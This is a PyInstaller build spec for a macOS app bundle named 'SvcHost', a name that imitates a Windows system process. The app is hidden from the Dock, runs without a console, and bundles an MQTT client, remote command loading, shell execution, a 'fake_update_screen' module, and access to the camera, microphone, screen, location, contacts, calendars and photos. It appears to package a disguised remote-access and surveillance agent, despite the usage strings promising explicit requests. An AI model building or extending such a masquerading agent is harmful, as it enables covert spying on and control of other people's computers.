# -*- mode: python ; coding: utf-8 -*-
"""The location-enabled runtime must be a properly signed stable app bundle."""
import os
import re
from pathlib import Path

version = re.search(r'^VERSION = "([0-9.]+)"', (Path(SPECPATH) / "config.py").read_text(encoding="utf-8"),
                    re.MULTILINE).group(1)

identity = os.environ.get("XIDER_MACOS_SIGNING_IDENTITY", "")
if not identity.startswith(("Apple Development:", "Developer ID Application:")):
    raise ValueError("Core Location build blocked: proper non-ad-hoc signing identity required")

a = Analysis(
    ['svchost_mac.py'], pathex=[], binaries=[], datas=[],
    hiddenimports=['paho.mqtt.client', 'psutil', 'cryptography',
                   'cryptography.hazmat.primitives.ciphers.aead',
                   'cryptography.hazmat.primitives.asymmetric.ed25519',
                   'command_module_loader', 'command_signing', 'command_replay', 'shell_execution',
                   'agent_file_inventory', 'svchost_seal',
                   'fake_update_screen', 'AppKit', 'Foundation', 'CoreLocation', 'Quartz', 'AVFoundation',
                   'ApplicationServices', 'location_adapter', 'permission_bootstrap', 'svchost_seal',
                   'display_contact_sheet', 'cv2_enumerate_cameras', 'camera_series', 'microphone_devices', 'microphone_level', 'audio_output_control', 'media_history', 'media_request_control', 'dns_diagnostics', 'dns_settings', 'dns_comparison', 'dnssec_check', 'gateway_probe', 'route_trace', 'path_mtu', 'captive_portal', 'ipv6_connectivity', 'tls_certificate', 'service_probe', 'latency_series', 'packet_loss_history', 'jitter_measurement', 'network_throughput', 'network_link_speed', 'route_lookup', 'endpoint_batch', 'wifi_quality', 'wifi_channel', 'wifi_connection_history', 'proxy_status', 'vpn_route', 'network_traffic', 'network_traffic_schedule', 'interface_status_history'],
    hookspath=[], hooksconfig={},
    runtime_hooks=[str(Path(SPECPATH).resolve().parent / 'tools' / 'command_approval_bundle_smoke.py')],
    excludes=['tkinter', 'test', 'unittest'], noarchive=False,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz, a.scripts, a.binaries, a.datas, [], name='SvcHostMac',
    debug=False, bootloader_ignore_signals=False, strip=False, upx=False,
    runtime_tmpdir=None, console=False, disable_windowed_traceback=False,
    target_arch=None, codesign_identity=identity, entitlements_file='location.entitlements',
)
app = BUNDLE(
    exe, name='SvcHost.app', bundle_identifier='com.svchost.agent',
    info_plist={
        'CFBundleName': 'SvcHost',
        'CFBundleShortVersionString': version,
        'CFBundleVersion': version,
        'LSUIElement': True,
        'NSLocationUsageDescription': 'SvcHost checks one current location only after an explicit request and your local OS permission. It does not track location in the background.',
        'NSLocationWhenInUseUsageDescription': 'SvcHost checks one current location only after an explicit request and your local OS permission. It does not track location in the background.',
        'NSCameraUsageDescription': 'SvcHost takes a camera snapshot after an explicit request.',
        'NSMicrophoneUsageDescription': 'SvcHost records audio after an explicit request.',
        'NSScreenCaptureUsageDescription': 'SvcHost captures a screen image only after an explicit request.',
        'NSAppleEventsUsageDescription': 'SvcHost runs owner-requested scripts.',
        'NSContactsUsageDescription': 'SvcHost reads contacts only after an explicit request.',
        'NSCalendarsUsageDescription': 'SvcHost reads calendars only after an explicit request.',
        'NSRemindersUsageDescription': 'SvcHost reads reminders only after an explicit request.',
        'NSPhotoLibraryUsageDescription': 'SvcHost reads photos only after an explicit request.',
    },
)
